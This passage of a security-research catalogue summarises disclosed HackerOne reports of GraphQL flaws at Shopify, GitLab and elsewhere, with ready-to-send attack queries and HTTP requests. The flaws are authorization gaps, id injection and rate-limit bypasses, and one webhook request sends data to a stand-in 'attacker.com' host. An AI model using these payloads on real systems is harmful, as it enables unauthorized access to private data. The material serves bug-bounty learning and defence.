+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Chain <b>GraphQL node id injection -&gt; internal Payments REST index</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A GraphQL node(id:) global ID is passed unencoded as the resource identifier to a Rails ActiveResource model whose transport is HTTP; ActiveResource does not re-encode the id, so URL-encoded characters in the id part of the gid inject path/query into the internal REST request.</p>
+<h4>Method</h4><ol><li>Find models exposed via the GraphQL node interface that are backed by ActiveResource (HTTP transport to an internal service).</li><li>Confirm the id is used verbatim in the internal path: node(id:'gid://app/Payment/1') -&gt; GET /payments/1.</li><li>URL-encode a '?' and '&amp;' inside the id part to break out of the path into query params: %3f = '?', %26 = '&amp;', trailing %26 to make the router ignore the appended .json.</li><li>Point the internal find at the index endpoint with attacker-chosen filters and use response timing (records found vs none) as an oracle.</li></ol>
+<div class="pre">query {
+  node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26") {
+    ... on User { id }
+  }
+}
+# -&gt; GET /payments/?core_hacker_username=jobert&amp;core_team_handle=security%26.json</div>
+<p class="insight"><b>Insight —</b> When a public GraphQL/id maps to an internal service call, test whether the identifier is encoded. URL-encoded ?/&amp; inside opaque IDs can pivot a single-record lookup into an index/filter call against an internal REST API; use RTT differences as a boolean oracle even when the response is always a 500.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/800231" target="_blank" rel="noopener">hackerone.com/reports/800231</a></span><a class="src" href="#report-800231" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1085332" style="--sv:var(--sev-med)" data-sev="2" data-votes="34" data-bounty="1900">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL query returns private objects (missing object-level authz)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1085332</b> · shopify · $1900 · 34 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The shopApps GraphQL query returns all apps including isPrivate:true entries with no per-object authorization filtering, letting an admin-scoped user enumerate every app (public and private) platform-wide.</p>
+<h4>Method</h4><ol><li>Capture the internal GraphQL request from the users admin page</li><li>Send shopApps(first:10000) selecting isPrivate/handle/name/clientId</li><li>Filter the response for isPrivate:true</li></ol>
+<div class="pre">{"query":"query { shopApps(first:10000){ edges{ node{ id isPrivate handle name title shopifyApiClientId }}}}"}</div>
+<p class="insight"><b>Insight —</b> GraphQL list/collection resolvers often lack the object-level authz enforced on single-item queries; request large 'first:' counts and grep for private/internal flags in the nodes.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1085332" target="_blank" rel="noopener">hackerone.com/reports/1085332</a></span><a class="src" href="#report-1085332" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1838329" style="--sv:var(--sev-med)" data-sev="2" data-votes="32" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL aggregation (aggs/terms) leaks private field values past row auth</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1838329</b> · HackerOne · none · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>HackerOne</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The search/opportunities_search endpoints applied access control to returned documents but not to the aggregation buckets, so terms aggregation over a field (e.g. handle) enumerated values from records the caller could not directly read.</p>
+<h4>Method</h4><ol><li>Open a GraphQL client authenticated as a low-privilege user</li><li>Call search/opportunities_search with an aggs terms aggregation on a sensitive field</li><li>Read the returned bucket keys, which include values from private/unauthorized records</li></ol>
+<div class="pre">query {
+  opportunities_search(query:{}, aggs:{results:{terms:{field:"handle"}}}) {
+    aggs
+  }
+}</div>
+<p class="insight"><b>Insight —</b> Aggregations, facets, counts, and sort/order-by are a classic row-level-security bypass: the row is hidden but its field value leaks through the aggregate. On any GraphQL/search API, try terms/histogram aggregations over id, handle, email, owner to exfiltrate hidden values.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1838329" target="_blank" rel="noopener">hackerone.com/reports/1838329</a></span><a class="src" href="#report-1838329" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-972355" style="--sv:var(--sev-med)" data-sev="2" data-votes="29" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL user(username) leaks private email / private fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#972355</b> · gitlab · awarded · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GraphQL exposes a top-level user(username) resolver whose fields (email, feature notifications, etc.) lack per-field authorization, so any authenticated user reads another user's private data by username. Related pattern: swapping the me{} node for user(username){} on the same query.</p>
+<h4>Method</h4><ol><li>Set your own email to private in settings to confirm the field is meant to be hidden</li><li>Query the GraphQL endpoint for the victim by username, requesting the sensitive field</li><li>Read the leaked value; iterate over a username list for mass leakage</li></ol>
+<div class="pre">query { user(username:"&lt;victim&gt;"){ email username } }
+
+/* variant (report 316810) - swap me for user to read private fields: */
+query New_feature { user(username:"&lt;victim&gt;"){ id username reputation new_feature_notification { name description url id } } }</div>
+<p class="insight"><b>Insight —</b> Enumerate every field reachable on a GraphQL user/object node by identifier and diff what a private setting is supposed to hide vs what the resolver actually returns. Field-level authz is frequently missing even when object-level access is intended to be public.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/972355" target="_blank" rel="noopener">hackerone.com/reports/972355</a></span><a class="src" href="#report-972355" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1350095" style="--sv:var(--sev-med)" data-sev="2" data-votes="26" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>No-permission staff creates webhook subscription -&gt; data exfiltration</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1350095</b> · shopify · awarded · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Chain <b>low-priv staff -&gt; webhook create -&gt; exfil bulk-operati</b></span><span>Tag <b>graphql</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The webhookSubscriptionCreate mutation does not verify the caller's permissions for the chosen topic, so a staff member with no permissions can subscribe a sensitive topic (BULK_OPERATIONS_FINISH) to an attacker callback URL and receive data they shouldn't access.</p>
+<h4>Method</h4><ol><li>Authenticate as a zero-permission staff user</li><li>Send webhookSubscriptionCreate for topic BULK_OPERATIONS_FINISH with your callbackUrl</li><li>Receive bulk-operation notifications/data at the attacker endpoint</li></ol>
+<div class="pre">POST /admin/internal/web/graphql/core?operation=PageStaff HTTP/1.1
+{"operationName":"webhookSubscriptionCreate","variables":{"topic":"BULK_OPERATIONS_FINISH","webhookSubscription":{"callbackUrl":"https://attacker.com"}},"query":"mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!){ webhookSubscriptionCreate(topic:$topic, webhookSubscription:$webhookSubscription){ userErrors{field message} webhookSubscription{ id } } }"}</div>
+<p class="insight"><b>Insight —</b> Webhook-subscription mutations are an underchecked exfiltration surface: try creating subscriptions for sensitive topics with a low-priv account and point callbackUrl at your collaborator. Missing per-topic authorization turns a benign-looking mutation into a data pipe.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1350095" target="_blank" rel="noopener">hackerone.com/reports/1350095</a></span><a class="src" href="#report-1350095" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-862835" style="--sv:var(--sev-med)" data-sev="2" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL introspection over unauthenticated WebSocket subscription</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#862835</b> · nuri · none · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>nuri</b></span><span>Surface <b>graphql</b></span><span>Chain <b>Schema dump -&gt; targeted BOLA/BFLA/mutation abuse.</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Even when the HTTP GraphQL endpoint enforces auth/disables introspection, the graphql-ws subscription transport accepts a full introspection query inside a 'start' message without authentication, dumping the entire schema.</p>
+<h4>Method</h4><ol><li>Find the GraphQL WebSocket endpoint (subscriptions transport, graphql-ws/subscriptions-transport-ws).</li><li>Open the socket and send a 'start' message whose payload.query is the standard IntrospectionQuery.</li><li>Receive the full schema (types, fields, mutations) despite HTTP-side auth/introspection controls.</li></ol>
+<div class="pre">// over the GraphQL WebSocket:
+{"type":"connection_init","payload":{}}
+{"type":"start","id":"1","payload":{"query":"query IntrospectionQuery{ __schema { queryType{name} mutationType{name} types{ name kind fields{ name } } } }"}}</div>
+<p class="insight"><b>Insight —</b> Auth/introspection hardening is frequently applied only to the HTTP transport. Always retest introspection over the WebSocket subscription channel; a schema dump there unlocks the rest of the API surface.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/862835" target="_blank" rel="noopener">hackerone.com/reports/862835</a></span><a class="src" href="#report-862835" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-958374" style="--sv:var(--sev-low)" data-sev="1" data-votes="74" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Collection query exposes list despite protected object field</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#958374</b> · security · 500 · 74 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The single-object field (user.h1_pentester) is correctly protected and returns null, but the corresponding collection query (pentester_profiles) has no authz and enumerates every pentester's username, skills, and state.</p>
+<h4>Method</h4><ol><li>Confirm the sensitive attribute is hidden on the per-object query (returns null)</li><li>Look for a sibling collection/list root field for the same data</li><li>Query the collection to dump the whole list the object query withheld</li></ol>
+<div class="pre">query { pentester_profiles { total_count nodes { state skills{ nodes{ name } } user{ username } } } }</div>
+<p class="insight"><b>Insight —</b> Field-level protection on one query path does not imply protection on another. For any hidden per-object attribute, hunt the plural/collection resolver, search endpoints, and aggregate counts - they are frequently left ungated.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/958374" target="_blank" rel="noopener">hackerone.com/reports/958374</a></span><a class="src" href="#report-958374" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-707406" style="--sv:var(--sev-low)" data-sev="1" data-votes="72" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL field-level authz gap leaks private program metadata</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#707406</b> · security · USD 500 · 72 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Team GraphQL object enforced authz on the program but not on individual scalar fields, so team(handle){industry} returned the industry of programs that are private/invisible.</p>
+<h4>Method</h4><ol><li>Enumerate/guess program handles</li><li>Query the team object requesting only low-guarded scalar fields</li><li>Read fields (industry) that should not be exposed for private programs</li></ol>
+<div class="pre">{"query": "query {team(handle:\"TARGET_HANDLE\"){_id,industry}}"}</div>
+<p class="insight"><b>Insight —</b> On GraphQL, authorization is often per-object but not per-field. Request individual scalar fields (industry, _id, counts) of 'private' objects one at a time to find leaks.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/707406" target="_blank" rel="noopener">hackerone.com/reports/707406</a></span><a class="src" href="#report-707406" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2166697" style="--sv:var(--sev-low)" data-sev="1" data-votes="37" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL alias batching to bulk-run a mutation past server-side limits</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2166697</b> · security · USD 500 · 37 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A single GraphQL document can contain many aliased copies of the same mutation. If per-request business limits (e.g. max 500 reports) are enforced per HTTP request rather than per operation, aliasing multiplies the effect; combined with single-packet/turbo-intruder it explodes further.</p>
+<h4>Method</h4><ol><li>Identify a rate/count-limited mutation (createReport)</li><li>Generate one query with ~75 aliased createReport mutations</li><li>POST it to /graphql as one request (creates ~75 in one shot)</li><li>Fire ~100 such requests via Turbo Intruder single-packet attack</li><li>Observe thousands of objects created, blowing past the intended cap</li></ol>
+<div class="pre">mutation BulkReports($team_handle: String!) {
+  a0: createReport(input: {team_handle: $team_handle, title: "t", vulnerability_information: "v", impact: "i", source: "s"}) { was_successful errors { edges { node { message } } } }
+  a1: createReport(input: {team_handle: $team_handle, title: "t", vulnerability_information: "v", impact: "i", source: "s"}) { was_successful }
+  ... repeat aliases a2..aN ...
+}</div>
+<p class="insight"><b>Insight —</b> When testing GraphQL, always try aliasing the same mutation N times in one document to bypass rate/count limits (and to brute-force OTP/coupons). Enforcement must count operations, not requests.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2166697" target="_blank" rel="noopener">hackerone.com/reports/2166697</a></span><a class="src" href="#report-2166697" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-818848" style="--sv:var(--sev-low)" data-sev="1" data-votes="30" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Read-only team members can read webhook secret + url (missing field-level authz)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#818848</b> · security · none · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The GraphQL team.webhooks field exposes all webhook properties, including the signing secret and url, to read-only team members who have no need for them - no field-level authorization on sensitive webhook attributes.</p>
+<h4>Method</h4><ol><li>Have an admin configure webhooks on the program</li><li>Log in as a read-only team member</li><li>Query team(handle:).webhooks.nodes for id, secret, url</li><li>Receive the webhook secrets and URLs</li></ol>
+<div class="pre">{ team(handle: "security") { webhooks { nodes { id secret url } } } }</div>
+<p class="insight"><b>Insight —</b> Enumerate every field on a GraphQL type as your lowest-privilege role; secrets/tokens/urls frequently lack per-field authorization even when the parent object is legitimately visible. Read-only != read-safe.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/818848" target="_blank" rel="noopener">hackerone.com/reports/818848</a></span><a class="src" href="#report-818848" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1264725" style="--sv:var(--sev-low)" data-sev="1" data-votes="30" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>UI privacy toggle not enforced at GraphQL layer</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1264725</b> · security · awarded · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A privacy/visibility toggle in the UI ('Show this blurb on my profile') only hides data client-side; the backing GraphQL field (public_reviews.public_feedback on the user object) still returns it to unauthenticated requesters.</p>
+<h4>Method</h4><ol><li>Set a profile field to hidden/private in the account settings UI</li><li>Open the profile in an incognito/unauthenticated session and inspect the XHR GraphQL calls</li><li>Replay the UserProfilePage query for the target username and read the field that should be hidden</li></ol>
+<div class="pre">POST /graphql HTTP/1.1
+Host: hackerone.com
+Content-Type: application/json
+
+{"operationName":"UserProfilePage","variables":{"resourceIdentifier":"&lt;victim&gt;"},"query":"query UserProfilePage($resourceIdentifier: String!){ user(username:$resourceIdentifier){ public_reviews(first:5){ edges{ node{ public_feedback team{ name handle } } } } } }"}</div>
+<p class="insight"><b>Insight —</b> Every UI-level 'hide/opt-out' toggle is a candidate: replay the underlying GraphQL/REST call unauthenticated and check whether the supposedly hidden field is still populated. The toggle often gates only rendering, not resolver authorization.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1264725" target="_blank" rel="noopener">hackerone.com/reports/1264725</a></span><a class="src" href="#report-1264725" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-587687" style="--sv:var(--sev-low)" data-sev="1" data-votes="26" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL mutation trusts userId/objectId variables (no ownership check)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#587687</b> · trint · none · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>trint</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The updateProject GraphQL mutation takes userId and projectId as variables and acts on them without checking the project belongs to the authenticated user, so passing another user's projectId renames their folder.</p>
+<h4>Method</h4><ol><li>Get victim's projectId</li><li>As attacker call the updateProject mutation with the victim's projectId (and their userId)</li><li>Folder/project is renamed for the victim</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: graphql2.TARGET
+Authorization: Bearer &lt;attacker JWT&gt;
+Content-Type: application/json
+
+{"operationName":"updateProject","variables":{"userId":"&lt;victim_or_attacker&gt;","projectName":"pwned","projectId":"&lt;VICTIM_PROJECT_ID&gt;"},"query":"mutation updateProject($userId:String!,$projectName:String!,$projectId:String!){updateProject(userId:$userId,projectName:$projectName,projectId:$projectId){_id projectName __typename}}"}</div>
+<p class="insight"><b>Insight —</b> GraphQL mutations that accept userId/ownerId/projectId as arguments are classic BOLA - the resolver often uses the argument as the authority instead of the session. Always retest every mutation with a cross-user object id.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/587687" target="_blank" rel="noopener">hackerone.com/reports/587687</a></span><a class="src" href="#report-587687" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-481518" style="--sv:var(--sev-low)" data-sev="1" data-votes="24" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reset GraphQL cost-based rate limit with a negative-cost query</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#481518</b> · shopify · none · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Cost-based (leaky-bucket) rate limiting computes query cost from pagination args without clamping to &gt;=0, so a negative connection argument (first: -N) yields a negative cost that refunds the bucket back toward its maximum.</p>
+<h4>Method</h4><ol><li>Deplete the app's query-cost bucket with a heavy nested query</li><li>Send a query containing a negative pagination arg (first: -1000)</li><li>The negative cost refills the bucket to max</li><li>Resume heavy querying indefinitely</li></ol>
+<div class="pre"># after draining the bucket, run a query with:
+{ appInstallations(first: -1000) { edges { node { id } } } }
+# negative cost refunds the leaky bucket back to maximum</div>
+<p class="insight"><b>Insight —</b> For cost-limited GraphQL APIs, fuzz pagination/limit args with negative and oversized values. If cost isn't clamped to non-negative, negatives become a rate-limit refill primitive. Also check that cost is computed on the requested (not returned) count.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/481518" target="_blank" rel="noopener">hackerone.com/reports/481518</a></span><a class="src" href="#report-481518" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-826176" style="--sv:var(--sev-low)" data-sev="1" data-votes="22" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Undocumented GraphQL analytics query returns non-public program data</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#826176</b> · security · awarded · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A GraphQL query field (program_analytics_benchmarks) lacks proper authorization, returning benchmark/response-time data for programs that is not exposed on their public profile.</p>
+<h4>Method</h4><ol><li>Enumerate GraphQL schema/fields (introspection or observed queries)</li><li>Call analytics/benchmark fields for a target team</li><li>Compare returned data against what the public UI shows</li><li>Non-public values (e.g. p50 time-to-bounty) confirm the leak</li></ol>
+<div class="pre">{
+  program_analytics_benchmarks(teams:"security", select:p50_time_to_bounty, from:response_targets,
+    where:{severity:{is_null:true}}, group:week_bounty_awarded_at,
+    start_date:"2019-10-01T00:00:00.000Z", end_date:"2020-10-01T00:00:00.000Z") { id x y }
+}</div>
+<p class="insight"><b>Insight —</b> GraphQL analytics/reporting fields are a common authz blind spot: the UI hides the data but the resolver does not enforce access. Introspect and query every analytics/benchmark/export field against targets you shouldn't see.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/826176" target="_blank" rel="noopener">hackerone.com/reports/826176</a></span><a class="src" href="#report-826176" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-633001" style="--sv:var(--sev-low)" data-sev="1" data-votes="17" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL exposes data hidden in REST/UI (field-level authz gap)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#633001</b> · gitlab · awarded · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Private/system notes are filtered out of the REST API and UI but the GraphQL resolver returns them without the same authorization check (CVE-2019-15576).</p>
+<h4>Method</h4><ol><li>Find data the UI/REST deliberately hides (private system notes on a public issue)</li><li>Query the same object via the GraphQL explorer, requesting the notes fields</li><li>Compare: GraphQL returns the hidden system notes, even unauthenticated</li></ol>
+<div class="pre">query { project(fullPath:"user/proj"){ issue(iid:"1"){ notes{ edges{ node{ body bodyHtml system author{ username } } } } } } }</div>
+<p class="insight"><b>Insight —</b> Whenever an app has both REST/UI and GraphQL, test parity: GraphQL resolvers often re-implement (and forget) the authorization filters applied elsewhere. Request the sensitive sub-fields directly.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/633001" target="_blank" rel="noopener">hackerone.com/reports/633001</a></span><a class="src" href="#report-633001" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-509574" style="--sv:var(--sev-low)" data-sev="1" data-votes="16" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL nested relationship traversal leaks private data</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#509574</b> · security · USD 500 · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Authorization is enforced on the direct object but not when the same private data (Slack private-channel names) is reached by traversing relationship edges in a GraphQL query.</p>
+<h4>Method</h4><ol><li>Join a team as a no-permission member</li><li>Build a GraphQL query that pivots team -&gt; slack_pipelines -&gt; team -&gt; slack_integration -&gt; channels</li><li>Read private channel names you were never invited to</li></ol>
+<div class="pre">query{ teams(where:{handle:{_eq:"team_handle"}}){ edges{ node{ slack_pipelines{ nodes{ team{ slack_integration{ channels{ name } } } } } } } } }</div>
+<p class="insight"><b>Insight —</b> Don't only test top-level GraphQL fields: pivot through relationship edges to reach sensitive data via an indirect path where per-field authz is missing. Enumerate every nested object reachable from an object you legitimately hold.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/509574" target="_blank" rel="noopener">hackerone.com/reports/509574</a></span><a class="src" href="#report-509574" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-423388" style="--sv:var(--sev-low)" data-sev="1" data-votes="14" data-bounty="1500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL scope pivoting to read out-of-permission data</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#423388</b> · shopify · 1500 · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Authorization was enforced per-UI-area but not consistently on GraphQL query roots/fields, so a token with only Apps access could traverse to unrelated root queries (locations, inventory, marketingActivities, publications) and read data it should not see.</p>
+<h4>Method</h4><ol><li>Obtain a low-scope API token (e.g. Apps-only) and open a GraphiQL-style app</li><li>Enumerate root queries the docs say require other permissions</li><li>Issue those queries directly and check for data returned instead of access-denied</li></ol>
+<div class="pre">query{ marketingActivities(first:100){edges{node{id title createdAt budget{total{amount}}}}} }
+query{ publications(first:100){edges{node{name id supportsFuturePublishing app{apiKey}}}} }
+query{ locations(first:50){edges{node{name address{address1 city}}}} }</div>
+<p class="insight"><b>Insight —</b> In GraphQL, authorization is often bound to UI routes rather than to resolvers - fuzz every root query/field with a minimal-scope token; missing per-field authz reads as data (not an error) and nested fields (e.g. app{apiKey}) leak secrets.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/423388" target="_blank" rel="noopener">hackerone.com/reports/423388</a></span><a class="src" href="#report-423388" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-419883" style="--sv:var(--sev-none)" data-sev="0" data-votes="57" data-bounty="802">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Subdomain sweep + GraphQL introspection to find unauth data endpoints</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#419883</b> · shopify · 802 · 57 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Chain <b>subdomain enum -&gt; unauth GraphQL -&gt; introspection -&gt</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Internal apps expose a /graphql endpoint without auth; introspection is enabled, so the full schema (and the queries that return internal data) can be recovered and abused.</p>
+<h4>Method</h4><ol><li>Enumerate all subdomains of the target cloud domain and fuzz /graphql on each, filtering for 200s.</li><li>Send an introspection query with the correct Content-Type: application/json header (missing header returns 'query string not present').</li><li>Read the schema, then chain queries: enumerate objects (e.g. allLocations) to obtain a key, then pivot that key into the data-bearing query.</li></ol>
+<div class="pre">POST /graphql HTTP/1.1
+Host: SUB.TARGETcloud.com
+Content-Type: application/json
+
+{"query": "query allLocations{allLocations{address, code, contact}}"}
+
+# then pivot with the returned code:
+{"query": "query location{location(code:\"OTT150, 8th Floor\"){taps{edges{node{percentRemaining, beer{brewery, style, abv}}}}}}"}</div>
+<p class="insight"><b>Insight —</b> Generalize a single public GraphQL report into a whole attack: sweep *.cloud subdomains for /graphql, always set Content-Type: application/json, run introspection, and chain enumeration queries to pivot from an identifier into sensitive data. Reading prior public reports to find the root pattern and applying it broadly is the methodology.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/419883" target="_blank" rel="noopener">hackerone.com/reports/419883</a></span><a class="src" href="#report-419883" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-347937" style="--sv:var(--sev-none)" data-sev="0" data-votes="39" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Permission-reason enum field as an oracle for hidden/private feature existence</h3><span class="fieldmark">◆ Info</span></div>
